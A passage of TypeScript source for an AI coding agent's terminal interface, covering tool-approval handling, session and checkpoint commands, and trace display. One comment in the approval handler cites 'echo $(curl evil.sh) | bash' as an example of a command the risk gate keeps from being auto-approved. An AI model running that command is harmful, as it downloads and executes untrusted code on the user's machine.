  // Handle approval request from bridge
  const handleApprovalRequest = useCallback(
    (request: TypesApprovalRequest) => {
      // Check if this matches an always-allowed pattern
      const pattern = generateApprovalPattern(request);
      // Only auto-approve low/moderate risk — high/critical always show dialog
      // This prevents e.g. approving "bash:echo" from auto-approving "echo $(curl evil.sh) | bash"
      const isAllowed =
        (request.risk === 'low' || request.risk === 'moderate') &&
        (alwaysAllowed.has(pattern) ||
          // Prefix match: if we allowed write_file:src/api/, also allow write_file:src/api/sub/file.ts
          [...alwaysAllowed].some((p) => pattern.startsWith(p) && p.endsWith('/')));
      if (isAllowed) {
        // Auto-approve without showing dialog
        approvalBridge?.resolve({ approved: true });
        return;
      }

      // Show dialog as normal
      setPendingApproval(request);
      setDenyReasonMode(false);
      setDenyReason('');
    },
    [alwaysAllowed, approvalBridge],
  );

  // Approve the pending request
  const handleApprove = useCallback(() => {
    if (approvalBridge && pendingApprovalRef.current) {
      approvalBridge.resolve({ approved: true });
      setPendingApproval(null);
      setDenyReasonMode(false);
      setDenyReason('');
    }
  }, [approvalBridge]);

  // Deny the pending request
  const handleDeny = useCallback(
    (reason?: string) => {
      if (approvalBridge && pendingApprovalRef.current) {
        approvalBridge.resolve({ approved: false, reason: reason || 'User denied' });
        setPendingApproval(null);
        setDenyReasonMode(false);
        setDenyReason('');
      }
    },
    [approvalBridge],
  );

  // Always allow this pattern for the rest of the session + persist to SQLite
  const handleAlwaysAllow = useCallback(() => {
    if (approvalBridge && pendingApprovalRef.current) {
      const pattern = generateApprovalPattern(pendingApprovalRef.current);
      setAlwaysAllowed((prev) => new Set(prev).add(pattern));
      // Persist to SQLite for session-scoped persistence
      const tool =
        pendingApprovalRef.current.tool || pendingApprovalRef.current.action || 'unknown';
      if (
        'rememberPermission' in sessionStore &&
        typeof sessionStore.rememberPermission === 'function'
      ) {
        sessionStore.rememberPermission(tool, 'always', pattern);
      }
      approvalBridge.resolve({ approved: true });
      setPendingApproval(null);
      setDenyReasonMode(false);
      setDenyReason('');
    }
  }, [approvalBridge, sessionStore]);

  // Enter deny with reason mode
  const handleDenyWithReason = useCallback(() => {
    setDenyReasonMode(true);
    setDenyReason('');
  }, []);

  // Cancel deny with reason mode
  const handleCancelDenyReason = useCallback(() => {
    setDenyReasonMode(false);
    setDenyReason('');
  }, []);

  // Connect approval bridge on mount
  useEffect(() => {
    if (approvalBridge) {
      approvalBridge.connect({
        onRequest: handleApprovalRequest,
      });
    }
  }, [approvalBridge, handleApprovalRequest]);

  // Budget extension handlers
  const handleBudgetExtensionRequest = useCallback((request: ExtensionRequest) => {
    setPendingBudgetExtension(request);
  }, []);

  const handleBudgetExtensionApprove = useCallback(() => {
    if (budgetExtensionBridge && pendingBudgetExtensionRef.current) {
      budgetExtensionBridge.resolve(pendingBudgetExtensionRef.current.suggestedExtension);
      setPendingBudgetExtension(null);
    }
  }, [budgetExtensionBridge]);

  const handleBudgetExtensionDeny = useCallback(() => {
    if (budgetExtensionBridge && pendingBudgetExtensionRef.current) {
      budgetExtensionBridge.resolve(null);
      setPendingBudgetExtension(null);
    }
  }, [budgetExtensionBridge]);

  // Connect budget extension bridge on mount
  useEffect(() => {
    if (budgetExtensionBridge) {
      budgetExtensionBridge.connect({
        onRequest: handleBudgetExtensionRequest,
      });
    }
  }, [budgetExtensionBridge, handleBudgetExtensionRequest]);

  // Learning validation handlers
  const handleLearningRequest = useCallback((learning: ProposedLearning) => {
    setPendingLearning(learning);
  }, []);

  const handleLearningApprove = useCallback(() => {
    if (learningValidationBridge && pendingLearningRef.current) {
      learningValidationBridge.resolve('approve');
      setPendingLearning(null);
    }
  }, [learningValidationBridge]);

  const handleLearningReject = useCallback(() => {
    if (learningValidationBridge && pendingLearningRef.current) {
      learningValidationBridge.resolve('reject');
      setPendingLearning(null);
    }
  }, [learningValidationBridge]);

  const handleLearningSkip = useCallback(() => {
    if (learningValidationBridge && pendingLearningRef.current) {
      learningValidationBridge.resolve('skip');
      setPendingLearning(null);
    }
  }, [learningValidationBridge]);

  // Connect learning validation bridge on mount
  useEffect(() => {
    if (learningValidationBridge) {
      learningValidationBridge.connect({
        onRequest: handleLearningRequest,
      });
    }
  }, [learningValidationBridge, handleLearningRequest]);

  // Subscribe to interactive planner events for plan display
  useEffect(() => {
    const planner = agent.getInteractivePlanner();
    if (!planner) return;
    const unsub = planner.on((event) => {
      if (event.type === 'plan.created') {
        setActivePlan({
          id: event.plan.id,
          goal: event.plan.goal,
          steps: event.plan.steps.map(s => ({
            id: s.id,
            number: s.number,
            description: s.description,
            status: s.status,
          })),
          status: event.plan.status,
          currentStepIndex: event.plan.currentStepIndex,
        });
        setPlanExpanded(true);
      } else if (event.type === 'step.completed' || event.type === 'step.failed' || event.type === 'step.skipped') {
        setActivePlan(prev => {
          if (!prev) return null;
          return {
            ...prev,
            steps: prev.steps.map(s =>
              s.id === event.step.id ? { ...s, status: event.step.status } : s,
            ),
          };
        });
      } else if (event.type === 'plan.completed' || event.type === 'plan.cancelled') {
        setActivePlan(prev => prev ? { ...prev, status: event.type === 'plan.completed' ? 'completed' : 'cancelled' } : null);
      }
    });
    return unsub;
  }, [agent]);

  // Hydrate always-allowed patterns from SQLite on mount
  useEffect(() => {
    if (
      'hasRememberedPermissionsFeature' in sessionStore &&
      typeof sessionStore.hasRememberedPermissionsFeature === 'function' &&
      sessionStore.hasRememberedPermissionsFeature() &&
      'listRememberedPermissions' in sessionStore &&
      typeof sessionStore.listRememberedPermissions === 'function'
    ) {
      const remembered = sessionStore.listRememberedPermissions() as Array<{
        toolName: string;
        pattern?: string;
        decision: 'always' | 'never';
        createdAt: string;
      }>;
      if (remembered.length > 0) {
        setAlwaysAllowed((prev) => {
          const next = new Set(prev);
          for (const r of remembered) {
            if (r.decision === 'always' && r.pattern) next.add(r.pattern);
          }
          return next;
        });
      }
    }
  }, [sessionStore]);

  // =========================================================================
  // AGENT EVENT HANDLING (extracted to hook)
  // =========================================================================
  const transparencyAggregatorRef = useAgentEvents({
    agent,
    refs: { executionModeRef, showThinkingRef, debugExpandedRef },
    setters: {
      setStatusThrottled,
      flushStatusThrottle,
      setToolCalls,
      setActiveAgents,
      setTasks,
      setSwarmStatus,
      setTransparencyState,
    },
    addMessage,
    debugBuffer,
  });

  // =========================================================================
  // COMMAND HANDLER
  // =========================================================================

  const handleCommand = useCallback(
    async (cmd: string, args: string[]) => {
      switch (cmd) {
        case 'quit':
        case 'exit':
        case 'q':
          await agent.cleanup();
          await mcpClient.cleanup();
          await lspManager.cleanup();
          exit();
          return;

        case 'clear':
        case 'cls':
          setMessages([]);
          setToolCalls([]);
          return;

        case 'status':
        case 'stats': {
          const metrics = agent.getMetrics();
          const agentState = agent.getState();
          const lines = [
            `Session Status:`,
            `  Status: ${agentState.status} | Iteration: ${agentState.iteration}`,
            `  Messages: ${agentState.messages.length}`,
            `  Tokens: ${metrics.totalTokens.toLocaleString()} (${metrics.inputTokens} in / ${metrics.outputTokens} out)`,
            `  LLM Calls: ${metrics.llmCalls} | Tool Calls: ${metrics.toolCalls}`,
            `  Cost: $${metrics.estimatedCost.toFixed(4)}`,
          ];
          const shared = agent.getSharedStats();
          if (shared) {
            lines.push(
              `  Shared Context: ${shared.context.failures} failures, ${shared.context.references} refs`,
            );
            lines.push(
              `  Shared Economics: ${shared.economics.fingerprints} fingerprints, ${shared.economics.globalLoops.length} doom loops`,
            );
          }
          addMessage('system', lines.join('\n'));
          return;
        }

        case 'help':
        case 'h':
          addMessage(
            'system',
            [
              '===== ATTOCODE COMMANDS =====',
              '',
              '> GENERAL',
              '  /help /h          Show this help',
              '  /quit /exit /q    Exit',
              '  /clear /cls       Clear screen',
              '  /reset            Reset agent state',
              '  /status /stats    Show metrics',
              '  /theme [name]     Show/change theme',
              '  /tools            List tools',
              '',
              '> SESSIONS & TASKS',
              '  /save             Save session',
              '  /sessions         List sessions',
              '  /load <id>        Load session by ID',
              '  /tasks            List tracked tasks',
              '  /checkpoint       Create checkpoint',
              '  /checkpoints      List checkpoints',
              '  /restore <id>     Restore checkpoint',
              '  /rollback [n]     Rollback n steps',
              '',
              '> THREADS (Branching)',
              '  /fork <name>      Fork into new thread',
              '  /threads          List all threads',
              '  /switch <id>      Switch to thread',
              '',
              '> CONTEXT',
              '  /context /ctx     Show token breakdown',
              '  /compact          Compress context',
              '',
              '> MCP',
              '  /mcp              List servers',
              '  /mcp tools        List MCP tools',
              '  /mcp search <q>   Search & load tools',
              '',
              '> SKILLS & AGENTS',
              '  /skills           List all skills',
              '  /skills new <n>   Create new skill',
              '  /skills info <n>  Show skill details',
              '  /agents           List all agents',
              '  /agents new <n>   Create new agent',
              '  /agents info <n>  Show agent details',
              '  /spawn <a> <task> Run agent with task',
              '',
              '> INITIALIZATION',
              '  /init             Setup .attocode/ directory',
              '',
              '> PLAN MODE',
              '  /mode             Show current mode',
              '  /plan             Toggle plan mode',
              '  /show-plan        Display pending plan',
              '  /approve [n]      Approve plan',
              '  /reject           Reject plan',
              '',
              '> DIAGNOSTICS',
              '  /tsc              Run TypeScript type check',
              '',
              '> TRACE ANALYSIS',
              '  /trace            Show trace summary',
              '  /trace --analyze  Run efficiency analysis',
              '  /trace issues     List detected issues',
              '  /trace fixes      List pending improvements',
              '',
              '===== SHORTCUTS =====',
              '  Ctrl+C      Exit',
              '  Ctrl+L      Clear screen',
              '  Ctrl+P      Help',
              '  Alt+T       Toggle tool details',
              '  Alt+O       Toggle thinking',
              '  Alt+I       Toggle transparency panel',
              '  Alt+K       Toggle tasks panel',
              '  Alt+D       Toggle debug panel',
              '  Alt+W       Toggle swarm panel',
              '  Alt+Y       Toggle diagnostics panel',
              '========================',
            ].join('\n'),
          );
          return;

        case 'reset':
          agent.reset();
          setMessages([]);
          setToolCalls([]);
          addMessage('system', 'Agent state reset');
          return;

        case 'save':
          try {
            const agentState = agent.getState();
            const agentMetrics = agent.getMetrics();
            const ckptId = `ckpt-manual-${Date.now().toString(36)}`;
            saveCheckpointToStore(sessionStore, {
              id: ckptId,
              label: 'manual-save',
              messages: agentState.messages,
              iteration: agentState.iteration,
              metrics: agentMetrics,
              plan: agentState.plan,
              memoryContext: agentState.memoryContext,
            });
            persistPendingPlanToStore();
            addMessage('system', `Session saved: ${currentSessionId} (checkpoint: ${ckptId})`);
          } catch (e) {
            addMessage('error', (e as Error).message);
          }
          return;

        case 'sessions':
          try {
            const sessions = await sessionStore.listSessions();
            addMessage('system', formatSessionsTable(sessions));
          } catch (e) {
            addMessage('error', (e as Error).message);
          }
          return;

        case 'load': {
          const targetSessionId = args[0];
          if (!targetSessionId) {
            addMessage(
              'system',
              'Usage: /load <session-id>\n  Use /sessions to list available sessions',
            );
            return;
          }

          // Check if session exists
          const targetSession = sessionStore.getSessionMetadata(targetSessionId);
          if (!targetSession) {
            addMessage(
              'error',
              `Session not found: ${targetSessionId}\n  Use /sessions to list available sessions`,
            );
            return;
          }

          try {
            addMessage(
              'system',
              `Loading session: ${targetSession.id}\n   Created: ${new Date(targetSession.createdAt).toLocaleString()}\n   Messages: ${targetSession.messageCount}`,
            );

            // Try to load from checkpoint first
            let loadCheckpointData: any;
            if (
              'loadLatestCheckpoint' in sessionStore &&
              typeof sessionStore.loadLatestCheckpoint === 'function'
            ) {
              const sqliteCheckpoint = sessionStore.loadLatestCheckpoint(targetSession.id);
              if (sqliteCheckpoint?.state) {
                loadCheckpointData = sqliteCheckpoint.state;
              }
            }

            // Fall back to loading from entries if no checkpoint
            if (!loadCheckpointData) {
              const entriesResult = sessionStore.loadSession(targetSession.id);
              const entries = Array.isArray(entriesResult) ? entriesResult : await entriesResult;
              const checkpoint = [...entries].reverse().find((e: any) => e.type === 'checkpoint');
              if (checkpoint?.data) {
                loadCheckpointData = checkpoint.data;
              } else {
                const messages = entries
                  .filter((e: any) => e.type === 'message')
                  .map((e: any) => e.data);
                if (messages.length > 0) {
                  agent.loadState({ messages });
                  addMessage('system', `+ Loaded ${messages.length} messages from session`);
                } else {
                  addMessage('system', 'No messages found in session');
                }
                return;
              }
            }

            // Load from checkpoint data
            if (loadCheckpointData?.messages) {
              agent.loadState({
                messages: loadCheckpointData.messages,
                iteration: loadCheckpointData.iteration,
                metrics: loadCheckpointData.metrics,
                plan: loadCheckpointData.plan,
                memoryContext: loadCheckpointData.memoryContext,
              });
              addMessage(
                'system',
                `+ Loaded ${loadCheckpointData.messages.length} messages from session${loadCheckpointData.iteration ? `\n   Iteration: ${loadCheckpointData.iteration}` : ''}${loadCheckpointData.plan ? '\n   Plan restored' : ''}`,
              );
            }
          } catch (e) {
            addMessage('error', `Error loading session: ${(e as Error).message}`);
          }
          return;
        }

        case 'tasks': {
          // Filter out deleted tasks
          const visibleTasks = tasks.filter((t) => t.status !== 'deleted');
          if (visibleTasks.length === 0) {
            addMessage(
              'system',
              'No tasks. Tasks are created when the agent uses task_create tool.',
            );
            return;
          }
          // Count by status
          const pending = visibleTasks.filter((t) => t.status === 'pending').length;
          const inProgress = visibleTasks.filter((t) => t.status === 'in_progress').length;
          const completed = visibleTasks.filter((t) => t.status === 'completed').length;
          // Format task list
          const taskLines = visibleTasks.map((t) => {
            const isBlocked = t.blockedBy.some((id) => {
              const blocker = visibleTasks.find((bt) => bt.id === id);
              return blocker && blocker.status !== 'completed';
            });
            const icon = isBlocked
              ? '◌'
              : t.status === 'completed'
                ? '✓'
                : t.status === 'in_progress'
                  ? '●'
                  : '○';
            const blockedInfo = isBlocked
              ? ` (blocked by: ${t.blockedBy.slice(0, 2).join(', ')})`
              : '';
            const activeInfo =
              t.status === 'in_progress' && t.activeForm ? `\n     └ ${t.activeForm}...` : '';
            return `  ${icon} ${t.id}  ${t.subject}${blockedInfo}${activeInfo}`;
          });
          addMessage(
            'system',
            [
              `TASKS [${pending} pending, ${inProgress} in_progress, ${completed} completed]`,
              '',
              ...taskLines,
              '',
              'Toggle panel: Alt+K',
            ].join('\n'),
          );
          return;
        }

        case 'context':
        case 'ctx': {
          const agentState = agent.getState();
          const mcpStats = mcpClient.getContextStats();
          const estimateTokens = (str: string) => estimateTokenCount(str);
          const systemPrompt = agent.getSystemPromptWithMode ? agent.getSystemPromptWithMode() : '';
          const systemTokens = estimateTokens(systemPrompt);
          const mcpTokens = mcpStats.summaryTokens + mcpStats.definitionTokens;
          const agentTools = agent.getTools().filter((t: any) => !t.name.startsWith('mcp_'));
          const agentToolTokens = agentTools.length * 150;
          const convTokens = agentState.messages
            .filter((m: any) => m.role !== 'system')
            .reduce(
              (sum: number, m: any) =>
                sum +
                estimateTokens(
                  typeof m.content === 'string' ? m.content : JSON.stringify(m.content),
                ),
              0,
            );
          const totalTokens = systemTokens + mcpTokens + agentToolTokens + convTokens;
          const contextLimit = agent.getMaxContextTokens();
          const percent = Math.round((totalTokens / contextLimit) * 100);
          const bar =
            '='.repeat(Math.min(20, Math.round(percent / 5))) +
            '-'.repeat(Math.max(0, 20 - Math.round(percent / 5)));

          addMessage(
            'system',
            [
              `Context (~${totalTokens.toLocaleString()} / ${contextLimit / 1000}k)`,
              `  [${bar}] ${percent}%`,
              `  System: ~${systemTokens.toLocaleString()}`,
              `  Tools:  ~${agentToolTokens.toLocaleString()} (${agentTools.length})`,
              `  MCP:    ~${mcpTokens.toLocaleString()} (${mcpStats.loadedCount}/${mcpStats.totalTools})`,
              `  Conv:   ~${convTokens.toLocaleString()} (${agentState.messages.length} msgs)`,
              percent >= 80 ? '  ! Consider /compact' : '  OK',
            ].join('\n'),
          );
          return;
        }

        case 'compact':
          try {
            const agentState = agent.getState();
            if (agentState.messages.length < 5) {
              addMessage('system', 'Not enough messages to compact.');
              return;
            }
            setIsProcessing(true);
            setStatus((s) => ({ ...s, mode: 'compacting' }));
            const result = await compactor.compact(agentState.messages);
            agent.loadMessages(result.preservedMessages);
            addMessage(
              'system',
              `Compacted: ${result.compactedCount + result.preservedMessages.length} -> ${result.preservedMessages.length} msgs`,
            );
          } catch (e) {
            addMessage('error', (e as Error).message);
          }
          setIsProcessing(false);
          setStatus((s) => ({ ...s, mode: 'ready' }));
          return;

        case 'mcp': {
          if (args[0] === 'tools') {
            const tools = mcpClient.getAllTools();
            if (tools.length === 0) {
              addMessage('system', 'No MCP tools available.');
            } else {
              const stats = mcpClient.getContextStats();
              addMessage(
                'system',
                `MCP Tools (${stats.loadedCount}/${stats.totalTools}):\n${tools
                  .slice(0, 15)
                  .map((t: any) => `  ${mcpClient.isToolLoaded(t.name) ? '[Y]' : '[ ]'} ${t.name}`)
                  .join('\n')}`,
              );
            }
            return;
          }
          if (args[0] === 'search' && args.slice(1).length > 0) {
            const query = args.slice(1).join(' ');
            const results = mcpClient.searchTools(query, { limit: 10 });
            if (results.length === 0) {
              addMessage('system', `No tools found for: "${query}"`);
            } else {
              const loaded = mcpClient.loadTools(results.map((r: any) => r.name));
              for (const tool of loaded) agent.addTool(tool);
              addMessage('system', `Found & loaded ${loaded.length} tools`);
            }
            return;
          }
          const servers = mcpClient.listServers();
          const stats = mcpClient.getContextStats();
          if (servers.length === 0) {
            addMessage('system', 'No MCP servers configured.');
          } else {
            addMessage(
              'system',
              [
                `MCP Servers:`,
                ...servers.map(
                  (s: any) =>
                    `  ${s.status === 'connected' ? '[OK]' : '[ ]'} ${s.name} - ${s.toolCount || 0} tools`,
                ),
                `Loaded: ${stats.loadedCount}/${stats.totalTools}`,
              ].join('\n'),
            );
          }
          return;
        }

        case 'tools': {
          const allTools = agent.getTools();
          const builtIn = allTools.filter((t: any) => !t.name.startsWith('mcp_'));
          const mcpTools = allTools.filter((t: any) => t.name.startsWith('mcp_'));
          addMessage(
            'system',
            [
              `Tools (${allTools.length}):`,
              `Built-in (${builtIn.length}):`,
              ...builtIn.slice(0, 10).map((t: any) => `  * ${t.name}`),
              builtIn.length > 10 ? `  ... +${builtIn.length - 10}` : '',
              `MCP (${mcpTools.length}):`,
              ...(mcpTools.length > 0
                ? mcpTools.slice(0, 5).map((t: any) => `  * ${t.name}`)
                : ['  (none)']),
            ]
              .filter(Boolean)
              .join('\n'),
          );
          return;
        }

        case 'checkpoint':
        case 'cp':
          try {
            const cp = agent.createCheckpoint(args.join(' ') || undefined);
            addMessage('system', `Checkpoint: ${cp.id}${cp.label ? ` (${cp.label})` : ''}`);
          } catch (e) {
            addMessage('error', (e as Error).message);
          }
          return;

        case 'checkpoints':
        case 'cps':
          try {
            const cps = agent.getCheckpoints();
            if (cps.length === 0) {
              addMessage('system', 'No checkpoints.');
            } else {
              addMessage(
                'system',
                `Checkpoints:\n${cps.map((cp: any) => `  ${cp.id}${cp.label ? ` - ${cp.label}` : ''}`).join('\n')}`,
              );
            }
          } catch (e) {
            addMessage('error', (e as Error).message);
          }
          return;

        case 'restore':
          if (!args[0]) {
            addMessage('system', 'Usage: /restore <checkpoint-id>');
            return;
          }
          if (agent.restoreCheckpoint(args[0])) {
            const msgs = agent.getState().messages;
            setMessages(
              msgs.map((m: any, i: number) => ({
                id: `msg-${i}`,
                role: m.role,
                content: typeof m.content === 'string' ? m.content : JSON.stringify(m.content),
                ts: new Date(),
              })),
            );
            addMessage('system', `Restored: ${args[0]} - ${msgs.length} messages`);
          } else {
            addMessage('system', `Not found: ${args[0]}`);
          }
          return;

        case 'rollback':
        case 'rb': {
          const steps = parseInt(args[0], 10) || 1;
          if (agent.rollback(steps)) {
            const msgs = agent.getState().messages;
            setMessages(
              msgs.map((m: any, i: number) => ({
                id: `msg-${i}`,
                role: m.role,
                content: typeof m.content === 'string' ? m.content : JSON.stringify(m.content),
                ts: new Date(),
              })),
            );
            addMessage('system', `Rolled back ${steps} step(s)`);
          } else {
            addMessage('system', 'Rollback failed');
          }
          return;
        }

        // Thread/branching commands
        case 'fork':
          if (args.length === 0) {
            addMessage('system', 'Usage: /fork <name>');
          } else {
            try {
              const threadId = agent.fork(args.join(' '));
              addMessage('system', `+ Forked: ${threadId}`);
            } catch (e) {
              addMessage('error', (e as Error).message);
            }
          }
          return;

        case 'threads':
          try {
            const threads = agent.getAllThreads();
            if (threads.length === 0) {
              addMessage('system', 'No threads.');
            } else {
              addMessage(
                'system',
                'Threads:\n' +
                  threads
                    .map(
                      (t: any) =>
                        `  ${t.id}${t.name ? ` - ${t.name}` : ''} (${t.messages?.length || 0} msgs)`,
                    )
                    .join('\n'),
              );
            }
          } catch (e) {
            addMessage('error', (e as Error).message);
          }
          return;

        case 'switch':
          if (args.length === 0) {
            addMessage('system', 'Usage: /switch <thread-id>');
          } else {
            const ok = agent.switchThread(args[0]);
            if (ok) {
              const msgs = agent.getState().messages;
              setMessages(
                msgs.map((m: any, i: number) => ({
                  id: `msg-${i}`,
                  role: m.role,
                  content: typeof m.content === 'string' ? m.content : JSON.stringify(m.content),
                  ts: new Date(),
                })),
              );
              addMessage('system', `Switched to: ${args[0]}`);
            } else {
              addMessage('system', `Not found: ${args[0]}`);
            }
          }
          return;

        case 'mode': {
          if (!args[0]) {
            const modeInfo = agent.getModeInfo();
            const hasPlan = agent.hasPendingPlan();
            addMessage(
              'system',
              [
                `Mode: ${modeInfo.icon} ${modeInfo.name}`,
                hasPlan ? `  Pending: ${agent.getPendingChangeCount()} changes` : '',
                agent.getAvailableModes(),
              ]
                .filter(Boolean)
                .join('\n'),
            );
          } else {
            agent.setMode(args[0].toLowerCase());
            const modeInfo = agent.getModeInfo();
            setStatus((s) => ({ ...s, mode: modeInfo.name === 'Plan' ? 'ready (plan)' : 'ready' }));
            addMessage('system', `Mode: ${modeInfo.icon} ${modeInfo.name}`);
          }
          return;
        }

        case 'plan': {
          agent.togglePlanMode();
          const modeInfo = agent.getModeInfo();
          setStatus((s) => ({ ...s, mode: modeInfo.name === 'Plan' ? 'ready (plan)' : 'ready' }));
          addMessage('system', `Mode: ${modeInfo.icon} ${modeInfo.name}`);
          if (modeInfo.name === 'Plan') {
            addMessage('system', 'Plan Mode: writes are queued. /show-plan, /approve, /reject');
          }
          return;
        }

        case 'show-plan':
          if (!agent.hasPendingPlan()) {
            addMessage('system', 'No pending plan.');
          } else {
            addMessage('system', agent.formatPendingPlan());
          }
          return;

        case 'approve': {
          if (!agent.hasPendingPlan()) {
            addMessage('system', 'No plan to approve.');
            return;
          }

          // Set execution mode - unified event handler will display events
          setIsProcessing(true);
          executionModeRef.current = 'approving';
          setExecutionMode('approving');
          setStatus((s) => ({ ...s, mode: 'executing plan' }));

          try {
            const count = args[0] ? parseInt(args[0], 10) : undefined;
            const result = await agent.approvePlan(count);

            if (result.success) {
              addMessage('system', `[OK] Executed ${result.executed} change(s)`);
            } else {
              addMessage(
                'system',
                `[!] ${result.executed} done, ${result.errors.length} errors:\n${result.errors.join('\n')}`,
              );
            }
          } catch (e) {
            addMessage('error', `Plan execution failed: ${(e as Error).message}`);
          } finally {
            finishExecutionMode();
            setIsProcessing(false);
            setToolCalls([]);
            if (agent.getMode() === 'plan') {
              agent.setMode('build');
            }
            setStatus((s) => ({ ...s, mode: 'ready' }));
          }
          return;
        }

        case 'reject':
          if (!agent.hasPendingPlan()) {
            addMessage('system', 'No plan to reject.');
            return;
          }
          agent.rejectPlan();
          addMessage('system', '[X] Plan rejected');
          if (agent.getMode() === 'plan') {
            agent.setMode('build');
            setStatus((s) => ({ ...s, mode: 'ready' }));
          }
          return;

        case 'theme': {
          const availableThemes = getThemeNames();
          if (!args[0]) {
            addMessage(
              'system',
              `Theme: ${currentThemeName}\nAvailable: ${availableThemes.join(', ')}`,
            );
            return;
          }
          const newTheme = args[0].toLowerCase();
          if (availableThemes.includes(newTheme) || newTheme === 'auto') {
            setCurrentThemeName(newTheme);
            addMessage('system', `Theme: ${newTheme}`);
          } else {
            addMessage('system', `Unknown theme: ${newTheme}`);
          }
          return;
        }

        case 'lsp': {
          const servers = lspManager.getActiveServers();
          addMessage(
            'system',
            servers.length > 0
              ? `LSP Active:\n${servers.map((s: string) => `  [OK] ${s}`).join('\n')}`
              : 'No LSP servers running',
          );
          return;
        }

        case 'tui':
          addMessage('system', 'TUI: Active (Ink + Static + Single useInput)');
          return;

        case 'model':
          addMessage('system', `Model: ${model || 'auto'}\nRestart to change.`);
          return;

        // Skills commands
        case 'skills': {
          const skillManager = agent.getSkillManager();
          if (skillManager) {
            // Create output adapter for TUI
            const tuiOutput: CommandOutput = {
              log: (msg: string) => addMessage('system', msg),
              error: (msg: string) => addMessage('error', msg),
              clear: () => setMessages([]),
            };
            const ctx = {
              agent,
              sessionId: currentSessionId,
              output: tuiOutput,
              integrations: {
                sessionStore,
                mcpClient,
                compactor,
                skillManager,
              },
            };
            await handleSkillsCommand(args, ctx, skillManager);
          } else {
            addMessage('system', 'Skills not enabled');
          }
          return;
        }

        // Init command
        case 'init': {
          const tuiOutput: CommandOutput = {
            log: (msg: string) => addMessage('system', msg),
            error: (msg: string) => addMessage('error', msg),
            clear: () => setMessages([]),
          };
          const ctx = {
            agent,
            sessionId: currentSessionId,
            output: tuiOutput,
            integrations: {
              sessionStore,
              mcpClient,
              compactor,
            },
          };
          await handleInitCommand(args, ctx);
          return;
        }

        // Subagent commands
        case 'agents': {
          const agentRegistry = agent.getAgentRegistry();
          if (agentRegistry) {
            const tuiOutput: CommandOutput = {
              log: (msg: string) => addMessage('system', msg),
              error: (msg: string) => addMessage('error', msg),
              clear: () => setMessages([]),
            };
            const ctx = {
              agent,
              sessionId: currentSessionId,
              output: tuiOutput,
              integrations: {
                sessionStore,
                mcpClient,
                compactor,
                agentRegistry,
              },
            };
            await handleAgentsCommand(args, ctx, agentRegistry);
          } else {
            addMessage('system', 'Agents not enabled');
          }
          return;
        }

        case 'spawn':
          if (args.length < 2) {
            addMessage('system', 'Usage: /spawn <agent-name> <task>');
            return;
          }
          setIsProcessing(true);
          setStatus((s) => ({ ...s, mode: 'spawning' }));
          try {
            const [agentName, ...taskParts] = args;
            const task = taskParts.join(' ');
            const result = await agent.spawnAgent(agentName, task);
            addMessage(
              'assistant',
              `Agent ${agentName}: ${result.success ? 'OK' : 'Failed'}\n${result.output}`,
            );
          } catch (e) {
            addMessage('error', (e as Error).message);
          }
          setIsProcessing(false);
          setStatus((s) => ({ ...s, mode: 'ready' }));
          return;

        // Trace analysis commands
        case 'trace': {
          const traceCollector = agent.getTraceCollector();

          if (args.length === 0) {
            // Show current session trace summary with subagent hierarchy
            if (!traceCollector) {
              addMessage('system', 'Tracing is not enabled. Start agent with --trace to enable.');
              return;
            }

            const data = traceCollector.getSessionTrace();
            if (!data || !data.iterations || data.iterations.length === 0) {
              addMessage('system', 'No trace data collected yet.');
              return;
            }

            // Get subagent hierarchy from JSONL file
            const hierarchy = await traceCollector.getSubagentHierarchy();

            if (hierarchy && hierarchy.subagents.length > 0) {
              // Show hierarchy view with subagents
              const lines = [
                'Trace Summary:',
                `  Session ID:    ${data.sessionId}`,
                `  Status:        ${data.status}`,
                `  Duration:      ${data.durationMs ? `${Math.round(data.durationMs / 1000)}s` : 'ongoing'}`,
                '',
                'Main Agent:',
                `  Iterations:    ${hierarchy.mainAgent.llmCalls}`,
                `  Input tokens:  ${hierarchy.mainAgent.inputTokens.toLocaleString()}`,
                `  Output tokens: ${hierarchy.mainAgent.outputTokens.toLocaleString()}`,
                `  Tool calls:    ${hierarchy.mainAgent.toolCalls}`,
                '',
                'Subagent Tree:',
              ];

              // Sort subagents by spawn time
              const sortedSubagents = hierarchy.subagents.sort(
                (a, b) => (a.spawnedAtIteration || 0) - (b.spawnedAtIteration || 0),
              );

              for (const sub of sortedSubagents) {
                const durationSec = Math.round(sub.duration / 1000);
                lines.push(`  └─ ${sub.agentId} (spawned iter ${sub.spawnedAtIteration || '?'})`);
                lines.push(
                  `     ├─ ${sub.inputTokens.toLocaleString()} in / ${sub.outputTokens.toLocaleString()} out tokens`,
                );
                lines.push(`     ├─ ${sub.toolCalls} tools | ${durationSec}s`);
              }

              lines.push(
                '',
                'TOTALS (all agents):',
                `  Input tokens:  ${hierarchy.totals.inputTokens.toLocaleString()}`,
                `  Output tokens: ${hierarchy.totals.outputTokens.toLocaleString()}`,
                `  Tool calls:    ${hierarchy.totals.toolCalls}`,
                `  LLM calls:     ${hierarchy.totals.llmCalls}`,
                `  Est. Cost:     $${hierarchy.totals.estimatedCost.toFixed(4)}`,
                `  Duration:      ${Math.round(hierarchy.totals.duration / 1000)}s`,
                '',
                'Use: /trace --analyze for efficiency analysis',
                '     /trace issues to see detected inefficiencies',
              );

              addMessage('system', lines.join('\n'));
            } else {
              // Original simple view (no subagents)
              addMessage(
                'system',
                [
                  'Trace Summary:',
                  `  Session ID:    ${data.sessionId}`,
                  `  Status:        ${data.status}`,
                  `  Iterations:    ${data.iterations.length}`,
                  `  Duration:      ${data.durationMs ? `${Math.round(data.durationMs / 1000)}s` : 'ongoing'}`,
                  '',
                  'Metrics:',
                  `  Input tokens:  ${data.metrics.inputTokens.toLocaleString()}`,
                  `  Output tokens: ${data.metrics.outputTokens.toLocaleString()}`,
                  `  Cache hit:     ${Math.round(data.metrics.avgCacheHitRate * 100)}%`,
                  `  Tool calls:    ${data.metrics.toolCalls}`,
                  `  Errors:        ${data.metrics.errors}`,
                  `  Est. Cost:     $${data.metrics.estimatedCost.toFixed(4)}`,
                  '',
                  'Use: /trace --analyze for efficiency analysis',
                  '     /trace issues to see detected inefficiencies',
                ].join('\n'),
              );
            }
          } else if (args[0] === '--analyze' || args[0] === 'analyze') {
            if (!traceCollector) {
              addMessage('system', 'Tracing is not enabled.');
              return;
            }

            const data = traceCollector.getSessionTrace();
            if (!data || !data.iterations || data.iterations.length === 0) {
              addMessage('system', 'No trace data to analyze.');
              return;
            }

            addMessage('system', 'Analyzing trace...');

            try {
              const { createTraceSummaryGenerator } = await import('../analysis/trace-summary.js');
              const generator = createTraceSummaryGenerator(data);
              const summary = generator.generate();

              const lines = [
